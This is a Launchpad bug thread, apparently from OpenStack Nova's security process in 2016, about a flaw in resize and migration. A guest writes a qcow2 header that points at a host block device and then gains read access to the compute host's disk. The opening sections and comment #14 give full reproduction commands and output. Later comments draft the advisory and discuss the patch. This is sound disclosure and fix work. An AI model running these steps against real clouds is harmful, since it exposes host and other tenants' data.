# nova boot --key-name local --image fedora --ephemeral size=1,format=ext4 --flavor 6 --nic net-id=b41000f6-9de2-4851-a622-2a5786167e83 test-boot
root@host # ps aux | grep qemu
qemu 18725 93.7 9.4 1421432 751232 ? Rl 14:00 6:47 /usr/libexec/qemu-kvm -name instance-00000005 -S -machine pc-i440fx-rhel7.2.0,accel=tcg,usb=off -m 512 -realtime mlock=off -smp 1,sockets=1,cores=1,threads=1 -uuid d56b9bf3-f3b0-4d76-952b-5015b43babcd -smbios type=1,manufacturer=Red Hat,product=OpenStack Compute,version=12.0.1-6.el7ost,serial=c512dcd1-48bb-644c-9794-82f056d85a95,uuid=d56b9bf3-f3b0-4d76-952b-5015b43babcd,family=Virtual Machine -no-user-config -nodefaults -chardev socket,id=charmonitor,path=/var/lib/libvirt/qemu/domain-instance-00000005/monitor.sock,server,nowait -mon chardev=charmonitor,id=monitor,mode=control -rtc base=utc -no-shutdown -boot strict=on -device piix3-usb-uhci,id=usb,bus=pci.0,addr=0x1.0x2 -drive file=/var/lib/nova/instances/d56b9bf3-f3b0-4d76-952b-5015b43babcd/disk,if=none,id=drive-virtio-disk0,format=raw,cache=none -device virtio-blk-pci,scsi=off,bus=pci.0,addr=0x4,drive=drive-virtio-disk0,id=virtio-disk0,bootindex=1 -drive file=/var/lib/nova/instances/d56b9bf3-f3b0-4d76-952b-5015b43babcd/disk.eph0,if=none,id=drive-virtio-disk1,format=raw,cache=none -device virtio-blk-pci,scsi=off,bus=pci.0,addr=0x5,drive=drive-virtio-disk1,id=virtio-disk1 -netdev tap,fd=26,id=hostnet0 -device virtio-net-pci,netdev=hostnet0,id=net0,mac=fa:16:3e:32:1c:23,bus=pci.0,addr=0x3 -chardev file,id=charserial0,path=/var/lib/nova/instances/d56b9bf3-f3b0-4d76-952b-5015b43babcd/console.log -device isa-serial,chardev=charserial0,id=serial0 -chardev pty,id=charserial1 -device isa-serial,chardev=charserial1,id=serial1 -device usb-tablet,id=input0 -vnc 0.0.0.0:0 -k en-us -device cirrus-vga,id=video0,bus=pci.0,addr=0x2 -device virtio-balloon-pci,id=balloon0,bus=pci.0,addr=0x6 -msg timestamp=on
- Confirm the block layout within the guest and umount the formatted ephemeral disk :
root@guest # lsblk
NAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINT
vda 252:0 0 5G 0 disk
└─vda1 252:1 0 5G 0 part /
vdb 252:16 0 1G 0 disk /mnt
root@guest # umount /mnt
- Use qemu-img to write a qcow2 header to the device using a physical device on the host as a backing file :
root@guest # qemu-img create -f qcow2 -o backing\_file=/dev/sda3,backing\_fmt=raw /dev/vdb 20G
Formatting '/dev/vdb', fmt=qcow2 size=21474836480 backing\_file='/dev/sda3' backing\_fmt='raw' encryption=off cluster\_size=65536 lazy\_refcounts=off refcount\_bits=16
root@guest # qemu-img info /dev/vdb
image: /dev/vdb
file format: qcow2
virtual size: 20G (21474836480 bytes)
disk size: 0
cluster\_size: 65536
backing file: /dev/sda3
backing file format: raw
Format specific information:
compat: 1.1
lazy refcounts: false
refcount bits: 16
corrupt: false
- Now request a resize of the instance :
# nova resize d56b9bf3-f3b0-4d76-952b-5015b43babcd 7
- Once complete confirm the qemu-kvm command line used to launch the instance, note the qcow2 format for the ephemeral disk :
root@host # ps aux | grep qemu
qemu 20762 99.8 5.5 1859748 436596 ? Rl 14:11 0:22 /usr/libexec/qemu-kvm -name instance-00000005 -S -machine pc-i440fx-rhel7.2.0,accel=tcg,usb=off -m 768 -realtime mlock=off -smp 1,sockets=1,cores=1,threads=1 -uuid d56b9bf3-f3b0-4d76-952b-5015b43babcd -smbios type=1,manufacturer=Red Hat,product=OpenStack Compute,version=12.0.1-6.el7ost,serial=599d7700-3d4b-1543-8882-f4ec4901c043,uuid=d56b9bf3-f3b0-4d76-952b-5015b43babcd,family=Virtual Machine -no-user-config -nodefaults -chardev socket,id=charmonitor,path=/var/lib/libvirt/qemu/domain-instance-00000005/monitor.sock,server,nowait -mon chardev=charmonitor,id=monitor,mode=control -rtc base=utc -no-shutdown -boot strict=on -device piix3-usb-uhci,id=usb,bus=pci.0,addr=0x1.0x2 -drive file=/var/lib/nova/instances/d56b9bf3-f3b0-4d76-952b-5015b43babcd/disk,if=none,id=drive-virtio-disk0,format=raw,cache=none -device virtio-blk-pci,scsi=off,bus=pci.0,addr=0x4,drive=drive-virtio-disk0,id=virtio-disk0,bootindex=1 -drive file=/var/lib/nova/instances/d56b9bf3-f3b0-4d76-952b-5015b43babcd/disk.eph0,if=none,id=drive-virtio-disk1,format=qcow2,cache=none -device virtio-blk-pci,scsi=off,bus=pci.0,addr=0x5,drive=drive-virtio-disk1,id=virtio-disk1 -netdev tap,fd=26,id=hostnet0 -device virtio-net-pci,netdev=hostnet0,id=net0,mac=fa:16:3e:32:1c:23,bus=pci.0,addr=0x3 -chardev file,id=charserial0,path=/var/lib/nova/instances/d56b9bf3-f3b0-4d76-952b-5015b43babcd/console.log -device isa-serial,chardev=charserial0,id=serial0 -chardev pty,id=charserial1 -device isa-serial,chardev=charserial1,id=serial1 -device usb-tablet,id=input0 -vnc 0.0.0.0:0 -k en-us -device cirrus-vga,id=video0,bus=pci.0,addr=0x2 -device virtio-balloon-pci,id=balloon0,bus=pci.0,addr=0x6 -msg timestamp=on
- Again within the guest confirm the block layout, note that there is now a 20G device mounted under /mnt :
root@guest # lsblk
NAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINT
vda 252:0 0 5G 0 disk
└─vda1 252:1 0 5G 0 part /
vdb 252:16 0 20G 0 disk /mnt
- As we have full access to the block device we can gain access not only to files on the host but potentially other instances as well :
root@guest # cat /mnt/etc/redhat-release
Red Hat Enterprise Linux Server release 7.2 (Maipo)
root@guest # qemu-img info /mnt/var/lib/nova/instances/d56b9bf3-f3b0-4d76-952b-5015b43babcd/disk.eph0
image: /mnt/var/lib/nova/instances/d56b9bf3-f3b0-4d76-952b-5015b43babcd/disk.eph0
file format: qcow2
virtual size: 20G (21474836480 bytes)
disk size: 1.0G
cluster\_size: 65536
backing file: /dev/sda3
backing file format: raw
Format specific information:
compat: 1.1
lazy refcounts: false
refcount bits: 16
corrupt: false
root@host # lsblk
NAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINT
sda 8:0 0 20G 0 disk
├─sda1 8:1 0 512M 0 part /boot
├─sda2 8:2 0 1G 0 part [SWAP]
└─sda3 8:3 0 18.5G 0 part /

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray) wrote on 2016-02-23: |  |  | [#8](/nova/%2Bbug/1548450/comments/8) |
| --- | --- | --- | --- |

Ouch, so backing file can be a block device. Thank for the detailed analysis Lee, I've confirmed the OSSA task and raises its priority accordingly...

Ouch, so backing file can be a block device. Thank for the detailed analysis Lee, I've confirmed the OSSA task and raises its priority accordingly...

| Changed in nova: | |
| --- | --- |
| **status**: | New → Confirmed |
| Changed in ossa: | |
| **status**: | Incomplete → Confirmed |
| **importance**: | Undecided → Critical |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray) wrote on 2016-02-23: |  |  | [#9](/nova/%2Bbug/1548450/comments/9) |
| --- | --- | --- | --- |

Impact description draft #1 (assuming write access):

Title: Nova host data access through resize/migration

Reporter: Matthew Booth (Red Hat)

Products: Nova

Affects: <=2015.1.2, >=12.0.0 <=12.0.1

Description:

Matthew Booth from Red Hat reported a vulnerability in Nova instance resize/migration. By overwriting an ephemeral or root disk with a malicious image before requesting a resize, an authenticated user may be able to read or write arbitrary files from the compute host. Only setups using libvirt driver and setting "use\_cow\_images = False" (not default) are affected.

Impact description draft #1 (assuming write access):
Title: Nova host data access through resize/migration
Reporter: Matthew Booth (Red Hat)
Products: Nova
Affects: <=2015.1.2, >=12.0.0 <=12.0.1
Description:
Matthew Booth from Red Hat reported a vulnerability in Nova instance resize/migration. By overwriting an ephemeral or root disk with a malicious image before requesting a resize, an authenticated user may be able to read or write arbitrary files from the compute host. Only setups using libvirt driver and setting "use\_cow\_images = False" (not default) are affected.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Lee Yarwood (lyarwood)](https://launchpad.net/~lyarwood) wrote on 2016-02-23: |  |  | [#10](/nova/%2Bbug/1548450/comments/10) |
| --- | --- | --- | --- |

Access is read only, writes are only applied to the ephemeral qcow2 file. apologies for not making that clear in my note.

Access is read only, writes are only applied to the ephemeral qcow2 file. apologies for not making that clear in my note.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray) wrote on 2016-02-23: |  |  | [#11](/nova/%2Bbug/1548450/comments/11) |
| --- | --- | --- | --- |

No worries, I also assumed the worst case in that early draft. This second version also narrow affected deployment to the one using raw storage.

Impact description draft #2:

Title: Nova host data leak through resize/migration

Reporter: Matthew Booth (Red Hat)

Products: Nova

Affects: <=2015.1.2, >=12.0.0 <=12.0.1

Description:

Matthew Booth from Red Hat reported a vulnerability in Nova instance resize/migration. By overwriting an ephemeral or root disk with a malicious image before requesting a resize, an authenticated user may be able to read arbitrary files from the compute host. Only setups using libvirt driver with raw storage and setting "use\_cow\_images = False" (not default) are affected.

No worries, I also assumed the worst case in that early draft. This second version also narrow affected deployment to the one using raw storage.
Impact description draft #2:
Title: Nova host data leak through resize/migration
Reporter: Matthew Booth (Red Hat)
Products: Nova
Affects: <=2015.1.2, >=12.0.0 <=12.0.1
Description:
Matthew Booth from Red Hat reported a vulnerability in Nova instance resize/migration. By overwriting an ephemeral or root disk with a malicious image before requesting a resize, an authenticated user may be able to read arbitrary files from the compute host. Only setups using libvirt driver with raw storage and setting "use\_cow\_images = False" (not default) are affected.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Matthew Booth (mbooth-9)](https://launchpad.net/~mbooth-9) wrote on 2016-02-24: |  |  | [#12](/nova/%2Bbug/1548450/comments/12) |
| --- | --- | --- | --- |

Just to capture it here, I wonder if the same vulnerability could exist for live migration. If we don't copy over disk.info, it's possible that a live migration followed by a reboot could result in the same vulnerability. Lee's looking into this.

Just to capture it here, I wonder if the same vulnerability could exist for live migration. If we don't copy over disk.info, it's possible that a live migration followed by a reboot could result in the same vulnerability. Lee's looking into this.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Matthew Booth (mbooth-9)](https://launchpad.net/~mbooth-9) wrote on 2016-02-24: |  |  | [#13](/nova/%2Bbug/1548450/comments/13) |
| --- | --- | --- | --- |

At first glance, I think live migration is vulnerable. pre\_live\_migration runs on the destination host, and runs \_create\_images\_and\_backing() without having copied over disk.info. \_create\_images\_and\_backing is passed disk\_info (not to be confused with disk.info) which was originally generated by libvirt.get\_instance\_disk\_info on the source host. This disk\_info is going to correctly identify the ephemeral disk as not having a backing file. It will create a blank disk of the correct format (raw) and size at the destination. The live migration process will then copy over the malicious bits to the blank disk, and the guest will run on the destination host using xml taken from the source host, which again will contain the correct backing information. However, as far as I can see, disk.info still does not exist on the destination at this point.

If the user reboots, \_hard\_reboot will regenerate the guest xml. Through a long chain of calls, this will result in a call to libvirt.\_get\_guest\_disk\_config for the ephemeral disk. This calls imagebackend.image(), which instantiates a Raw object. That instantiation calls correct\_format(), which calls resolve\_driver\_format(), which sees that there is no disk.info, inspects the disk and incorrectly reports it as qcow2 with the malicious backing file. At this point, the user can access the backing file.

Long story short: pre\_live\_migration should probably also copy disk.info.

At first glance, I think live migration is vulnerable. pre\_live\_migration runs on the destination host, and runs \_create\_images\_and\_backing() without having copied over disk.info. \_create\_images\_and\_backing is passed disk\_info (not to be confused with disk.info) which was originally generated by libvirt.get\_instance\_disk\_info on the source host. This disk\_info is going to correctly identify the ephemeral disk as not having a backing file. It will create a blank disk of the correct format (raw) and size at the destination. The live migration process will then copy over the malicious bits to the blank disk, and the guest will run on the destination host using xml taken from the source host, which again will contain the correct backing information. However, as far as I can see, disk.info still does not exist on the destination at this point.
If the user reboots, \_hard\_reboot will regenerate the guest xml. Through a long chain of calls, this will result in a call to libvirt.\_get\_guest\_disk\_config for the ephemeral disk. This calls imagebackend.image(), which instantiates a Raw object. That instantiation calls correct\_format(), which calls resolve\_driver\_format(), which sees that there is no disk.info, inspects the disk and incorrectly reports it as qcow2 with the malicious backing file. At this point, the user can access the backing file.
Long story short: pre\_live\_migration should probably also copy disk.info.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Lee Yarwood (lyarwood)](https://launchpad.net/~lyarwood) wrote on 2016-02-24: |  |  | [#14](/nova/%2Bbug/1548450/comments/14) |
| --- | --- | --- | --- |

I've reproduced this case where a qcow2 header is written to the raw ephemeral on the source host before it and any associated storage is then live migrated. In this case disk.info is regenerated on the destination. After a hard reboot the instance then uses the ephemeral disk as if it were a qcow2 file. Again, my notes on this are below :

root@source # cat /var/lib/nova/instances/d7166c75-7561-4788-9bc0-481eee78082f/disk.info

{"/var/lib/nova/instances/d7166c75-7561-4788-9bc0-481eee78082f/disk": "raw", "/var/lib/nova/instances/d7166c75-7561-4788-9bc0-481eee78082f/disk.eph0": "raw"}

root@guest # lsblk

NAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINT

vda 252:0 0 5G 0 disk

└─vda1 252:1 0 5G 0 part /

vdb 252:16 0 1G 0 disk /mnt

root@guest # umount /mnt

root@guest # qemu-img create -f qcow2 -o backing\_file=/dev/sda3,backing\_fmt=raw /dev/vdb 20G

Formatting '/dev/vdb', fmt=qcow2 size=21474836480 backing\_file='/dev/sda3' backing\_fmt='raw' encryption=off cluster\_size=65536 lazy\_refcounts=off refcount\_bits=16

[root@test-live-migrate ~]# lsblk

NAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINT

vda 252:0 0 5G 0 disk

└─vda1 252:1 0 5G 0 part /

vdb 252:16 0 1G 0 disk

root@guest # qemu-img info /dev/vdb

image: /dev/vdb

file format: qcow2

virtual size: 20G (21474836480 bytes)

disk size: 0

cluster\_size: 65536

backing file: /dev/sda3

backing file format: raw

Format specific information:

    compat: 1.1

    lazy refcounts: false

    refcount bits: 16

    corrupt: false

# nova live-migration --block-migrate test-live-migrate

root@destination # ps aux | grep qemu

qemu 17656 10.6 3.3 1236024 262832 ? Sl 09:20 0:09 /usr/libexec/qemu-kvm -name instance-00000009 [..] -device virtio-blk-pci,scsi=off,bus=pci.0,addr=0x4,drive=drive-virtio-disk0,id=virtio-disk0,bootindex=1 -drive file=/var/lib/nova/instances/d7166c75-7561-4788-9bc0-481eee78082f/disk.eph0,if=none,id=drive-virtio-disk1,format=raw,cache=none [..]

root@destination # cat /var/lib/nova/instances/d7166c75-7561-4788-9bc0-481eee78082f/disk.info

{"/var/lib/nova/instances/d7166c75-7561-4788-9bc0-481eee78082f/disk": "raw", "/var/lib/nova/instances/d7166c75-7561-4788-9bc0-481eee78082f/disk.eph0": "qcow2"}

# nova reboot --hard test-live-migrate

root@destination # ps aux | grep qemu

qemu 18684 101 4.1 1209396 326928 ? Sl 09:23 0:11 /usr/libexec/qemu-kvm -name instance-00000009 [..] -device virtio-blk-pci,scsi=off,bus=pci.0,addr=0x4,drive=drive-virtio-disk0,id=virtio-disk0,bootindex=1 -drive file=/var/lib/nova/instances/d7166c75-7561-4788-9bc0-481eee78082f/disk.eph0,if=none,id=drive-virtio-disk1,format=qcow2,cache=none [..]

root@guest # lsblk

NAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINT

vda 252:0 0 5G 0 disk

└─vda1 252:1 0 5G 0 part /

vdb 252:16 0 20G 0 disk /mnt

root@guest # ll /mnt/etc/redhat-release

-rw-r--r--. 1 root root 52 Oct 23 13:25 /mnt/etc/redhat-release

I've reproduced this case where a qcow2 header is written to the raw ephemeral on the source host before it and any associated storage is then live migrated. In this case disk.info is regenerated on the destination. After a hard reboot the instance then uses the ephemeral disk as if it were a qcow2 file. Again, my notes on this are below :
root@source # cat /var/lib/nova/instances/d7166c75-7561-4788-9bc0-481eee78082f/disk.info
{"/var/lib/nova/instances/d7166c75-7561-4788-9bc0-481eee78082f/disk": "raw", "/var/lib/nova/instances/d7166c75-7561-4788-9bc0-481eee78082f/disk.eph0": "raw"}
root@guest # lsblk
NAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINT
vda 252:0 0 5G 0 disk
└─vda1 252:1 0 5G 0 part /
vdb 252:16 0 1G 0 disk /mnt
root@guest # umount /mnt
root@guest # qemu-img create -f qcow2 -o backing\_file=/dev/sda3,backing\_fmt=raw /dev/vdb 20G
Formatting '/dev/vdb', fmt=qcow2 size=21474836480 backing\_file='/dev/sda3' backing\_fmt='raw' encryption=off cluster\_size=65536 lazy\_refcounts=off refcount\_bits=16
[root@test-live-migrate ~]# lsblk
NAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINT
vda 252:0 0 5G 0 disk
└─vda1 252:1 0 5G 0 part /
vdb 252:16 0 1G 0 disk
root@guest # qemu-img info /dev/vdb
image: /dev/vdb
file format: qcow2
virtual size: 20G (21474836480 bytes)
disk size: 0
cluster\_size: 65536
backing file: /dev/sda3
backing file format: raw
Format specific information:
compat: 1.1
lazy refcounts: false
refcount bits: 16
corrupt: false
# nova live-migration --block-migrate test-live-migrate
root@destination # ps aux | grep qemu
qemu 17656 10.6 3.3 1236024 262832 ? Sl 09:20 0:09 /usr/libexec/qemu-kvm -name instance-00000009 [..] -device virtio-blk-pci,scsi=off,bus=pci.0,addr=0x4,drive=drive-virtio-disk0,id=virtio-disk0,bootindex=1 -drive file=/var/lib/nova/instances/d7166c75-7561-4788-9bc0-481eee78082f/disk.eph0,if=none,id=drive-virtio-disk1,format=raw,cache=none [..]
root@destination # cat /var/lib/nova/instances/d7166c75-7561-4788-9bc0-481eee78082f/disk.info
{"/var/lib/nova/instances/d7166c75-7561-4788-9bc0-481eee78082f/disk": "raw", "/var/lib/nova/instances/d7166c75-7561-4788-9bc0-481eee78082f/disk.eph0": "qcow2"}
# nova reboot --hard test-live-migrate
root@destination # ps aux | grep qemu
qemu 18684 101 4.1 1209396 326928 ? Sl 09:23 0:11 /usr/libexec/qemu-kvm -name instance-00000009 [..] -device virtio-blk-pci,scsi=off,bus=pci.0,addr=0x4,drive=drive-virtio-disk0,id=virtio-disk0,bootindex=1 -drive file=/var/lib/nova/instances/d7166c75-7561-4788-9bc0-481eee78082f/disk.eph0,if=none,id=drive-virtio-disk1,format=qcow2,cache=none [..]
root@guest # lsblk
NAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINT
vda 252:0 0 5G 0 disk
└─vda1 252:1 0 5G 0 part /
vdb 252:16 0 20G 0 disk /mnt
root@guest # ll /mnt/etc/redhat-release
-rw-r--r--. 1 root root 52 Oct 23 13:25 /mnt/etc/redhat-release

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray) wrote on 2016-02-24: |  |  | [#15](/nova/%2Bbug/1548450/comments/15) |
| --- | --- | --- | --- |

The impact for live migration is a bit different since this action is not authorized (by default) for regular user. The exploitation would need another bug to force the migration...

Lee, any chance you try the hard-reboot case as described in comment #13 ?

To sum-up, the disk info needs to be copied in pre\_live\_migration, migrate\_disk\_and\_power\_off and \_hard\_reboot (instead of being introspected). Is this something safe to implement all the way down to Kilo ?

The impact for live migration is a bit different since this action is not authorized (by default) for regular user. The exploitation would need another bug to force the migration...
Lee, any chance you try the hard-reboot case as described in comment #13 ?
To sum-up, the disk info needs to be copied in pre\_live\_migration, migrate\_disk\_and\_power\_off and \_hard\_reboot (instead of being introspected). Is this something safe to implement all the way down to Kilo ?

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Daniel Berrange (berrange)](https://launchpad.net/~berrange) wrote on 2016-02-25: |  |  | [#16](/nova/%2Bbug/1548450/comments/16) |
| --- | --- | --- | --- |

We don't need to copy disk.info during live migration. The libvirt XML contains the authoritative information about the disk format during live migration. The destination host simply needs to re-generate disk.info based on the disk format listed in the XML of the incoming VM.

We don't need to copy disk.info during live migration. The libvirt XML contains the authoritative information about the disk format during live migration. The destination host simply needs to re-generate disk.info based on the disk format listed in the XML of the incoming VM.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Matthew Booth (mbooth-9)](https://launchpad.net/~mbooth-9) wrote on 2016-02-25: |  |  | [#17](/nova/%2Bbug/1548450/comments/17) |
| --- | --- | --- | --- |

Lee has a patch which reconstructs it from the confusingly similar disk\_info, which amounts to the same thing. There are other reasons I want to copy disk.info in preference to this approach, but they're not relevant here and fixing this issue takes precedence. Hopefully Lee's patch will be ready for sharing later today.

Lee has a patch which reconstructs it from the confusingly similar disk\_info, which amounts to the same thing. There are other reasons I want to copy disk.info in preference to this approach, but they're not relevant here and fixing this issue takes precedence. Hopefully Lee's patch will be ready for sharing later today.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Lee Yarwood (lyarwood)](https://launchpad.net/~lyarwood) wrote on 2016-02-25: |  |  | [#18](/nova/%2Bbug/1548450/comments/18) |
| --- | --- | --- | --- |

Tristan, just to be clear the --hard reboot case described in c#13 is \_after\_ a live migration where the disk.info has been incorrectly recreated on the destination by the Raw imagebackend inspecting the disks. A standalone --hard reboot does not remove this file and so the Raw imagebackend does not recreate it incorrectly. Attaching my current patch to this LP now, still requires more extensive testing so feedback is very welcome.

Tristan, just to be clear the --hard reboot case described in c#13 is \_after\_ a live migration where the disk.info has been incorrectly recreated on the destination by the Raw imagebackend inspecting the disks. A standalone --hard reboot does not remove this file and so the Raw imagebackend does not recreate it incorrectly. Attaching my current patch to this LP now, still requires more extensive testing so feedback is very welcome.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray) wrote on 2016-02-25: |  |  | [#19](/nova/%2Bbug/1548450/comments/19) |
| --- | --- | --- | --- |

Thank for the quick patch, I'm currently setting up rdo-kilo and devstack-liberty environment to reproduce and test the fix.

Thank for the quick patch, I'm currently setting up rdo-kilo and devstack-liberty environment to reproduce and test the fix.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Matthew Booth (mbooth-9)](https://launchpad.net/~mbooth-9) wrote on 2016-02-25: |  |  | [#20](/nova/%2Bbug/1548450/comments/20) |
| --- | --- | --- | --- |

On the topic of live-migrate being an admin issue, the bug remains after a live-migrate until the instance is recreated. This means that if the user believes that a live-migration has occurred on their instance, they can then create the malicious qcow2 and initiate the reboot afterwards. They might detect this directly from the performance impact on the guest.

Alternatively, they might create the malicious header, and then setup a job to automatically reboot the instance from time to time and test if data leakage has occurred. If the operator ever live migrates the guest, this will eventually succeed.

On the topic of live-migrate being an admin issue, the bug remains after a live-migrate until the instance is recreated. This means that if the user believes that a live-migration has occurred on their instance, they can then create the malicious qcow2 and initiate the reboot afterwards. They might detect this directly from the performance impact on the guest.
Alternatively, they might create the malicious header, and then setup a job to automatically reboot the instance from time to time and test if data leakage has occurred. If the operator ever live migrates the guest, this will eventually succeed.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Dan Smith (danms)](https://launchpad.net/~danms) wrote on 2016-02-25: |  |  | [#21](/nova/%2Bbug/1548450/comments/21) |
| --- | --- | --- | --- |

I'm good with the live migrate case of this. Obviously this code all needs to be cleaned up and unified, but...

Talking to Lee in the back channel, it sounds like the cold case might be copying the file over top of itself if we're on shared storage, which would be a bad idea. So I think he needs to make a change to fix that.

In general, I hate the idea of copying this file between the compute nodes because it becomes an issue for us potentially evolving the content/format of that file, and then copying a new-format file to an older compute node which can't understand it. However, I think we probably already have that case if we're on shared storage, where the file lives in a shared-by-both location. That's a time bomb waiting to go off, but we'll just have to deal with it when it happens I guess.

I'm good with the live migrate case of this. Obviously this code all needs to be cleaned up and unified, but...
Talking to Lee in the back channel, it sounds like the cold case might be copying the file over top of itself if we're on shared storage, which would be a bad idea. So I think he needs to make a change to fix that.
In general, I hate the idea of copying this file between the compute nodes because it becomes an issue for us potentially evolving the content/format of that file, and then copying a new-format file to an older compute node which can't understand it. However, I think we probably already have that case if we're on shared storage, where the file lives in a shared-by-both location. That's a time bomb waiting to go off, but we'll just have to deal with it when it happens I guess.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Lee Yarwood (lyarwood)](https://launchpad.net/~lyarwood) wrote on 2016-02-25: |  |  | [#22](/nova/%2Bbug/1548450/comments/22) |
| --- | --- | --- | --- |

Apologies for the confusion Dan, the cold case doesn't overwrite the disk.info file as we've moved the inst\_base to inst\_base + '\_resize' before copying only the images back into inst\_base. inst\_base itself is either recreated locally for shared storage or remotely for non-shared storage, either way disk.info doesn't exist in the new directory. Again apologies for the confusion.

Apologies for the confusion Dan, the cold case doesn't overwrite the disk.info file as we've moved the inst\_base to inst\_base + '\_resize' before copying only the images back into inst\_base. inst\_base itself is either recreated locally for shared storage or remotely for non-shared storage, either way disk.info doesn't exist in the new directory. Again apologies for the confusion.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Sean Dague (sdague)](https://launchpad.net/~sdague) wrote on 2016-02-25: |  |  | [#23](/nova/%2Bbug/1548450/comments/23) |
| --- | --- | --- | --- |

It seems like backing\_file can never be trusted from qemu info. Even if we spot fix the issue today, something else will slip in later that uses it, and we'll do this drill all over again.

How hard would it be to cut off that case entirely?

It seems like backing\_file can never be trusted from qemu info. Even if we spot fix the issue today, something else will slip in later that uses it, and we'll do this drill all over again.
How hard would it be to cut off that case entirely?

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Andrew Laski (alaski)](https://launchpad.net/~alaski) wrote on 2016-02-25: |  |  | [#24](/nova/%2Bbug/1548450/comments/24) |
| --- | --- | --- | --- |

I have not tested the patch but it looks fine to me from a pure review POV and it should address some of these cases. I think Sean makes a great point that this is just addressing another symptom rather than treating the disease. So while I'm fine moving forward with this patch after some testing has been done I would rather see a more robust approach as well.

I also agree with Dan that recreating the file would be a better approach than copying it. We lock ourselves into the current format if it's copied around.

I have not tested the patch but it looks fine to me from a pure review POV and it should address some of these cases. I think Sean makes a great point that this is just addressing another symptom rather than treating the disease. So while I'm fine moving forward with this patch after some testing has been done I would rather see a more robust approach as well.
I also agree with Dan that recreating the file would be a better approach than copying it. We lock ourselves into the current format if it's copied around.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Matthew Booth (mbooth-9)](https://launchpad.net/~mbooth-9) wrote on 2016-02-25: |  |  | [#25](/nova/%2Bbug/1548450/comments/25) |
| --- | --- | --- | --- |

Sean, come talk to me at summit. We'll get along just fine :)

Seriously, I had a patch for doing this the other day, but had to back away from it for performance reasons. I want to get back there, though, but we need to give operators a heads up first that they don't want to be using ext3 any more for ephemeral disks. It's problematic for more reasons than just security: [https://bugs.launchpad.net/nova/+bug/1547582](https://bugs.launchpad.net/nova/%2Bbug/1547582) .

My libvirt storage pools series is a huge cleanup in this area, and I'm not done yet. It's how I discovered both this CVE and the one from last month.

Sean, come talk to me at summit. We'll get along just fine :)
Seriously, I had a patch for doing this the other day, but had to back away from it for performance reasons. I want to get back there, though, but we need to give operators a heads up first that they don't want to be using ext3 any more for ephemeral disks. It's problematic for more reasons than just security: https://bugs.launchpad.net/nova/+bug/1547582 .
My libvirt storage pools series is a huge cleanup in this area, and I'm not done yet. It's how I discovered both this CVE and the one from last month.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Daniel Berrange (berrange)](https://launchpad.net/~berrange) wrote on 2016-02-25: |  |  | [#26](/nova/%2Bbug/1548450/comments/26) |
| --- | --- | --- | --- |

Agree with Sean, that it is about time that we added some protection to image backend, such that it either reads from disk.info, or raises an exception. ie delete/block any code path that involves running qemu-img info to get backing file, as that is pretty much is always unsafe. I'm fine with that being a patch we do later though.

The patch from Lee looks reasonable to me.

Agree with Sean, that it is about time that we added some protection to image backend, such that it either reads from disk.info, or raises an exception. ie delete/block any code path that involves running qemu-img info to get backing file, as that is pretty much is always unsafe. I'm fine with that being a patch we do later though.
The patch from Lee looks reasonable to me.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Lee Yarwood (lyarwood)](https://launchpad.net/~lyarwood) wrote on 2016-02-25: |  |  | [#27](/nova/%2Bbug/1548450/comments/27) |
| --- | --- | --- | --- |

Quickly documenting another potentially exploitable use case before I call it a night. It might be possible to hit this when calling shelve and then unshelve against an instance. I've not had time today to confirm but I suspect writing qcow2 headers to the root disk that we snapshot as part of the shelving process would also cause the imagebackend to incorrectly identify the disk once the we unshelve the instance. I'll look into this tomorrow morning.

Quickly documenting another potentially exploitable use case before I call it a night. It might be possible to hit this when calling shelve and then unshelve against an instance. I've not had time today to confirm but I suspect writing qcow2 headers to the root disk that we snapshot as part of the shelving process would also cause the imagebackend to incorrectly identify the disk once the we unshelve the instance. I'll look into this tomorrow morning.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray) wrote on 2016-02-25: |  |  | [#28](/nova/%2Bbug/1548450/comments/28) |
| --- | --- | --- | --- |

I confirm the scenario described in comment #7 reproduces with a stable/liberty devstack and I verified the patch successfully fix the issue: after the resize, /dev/vdb is still a raw device with the qcow header visible.

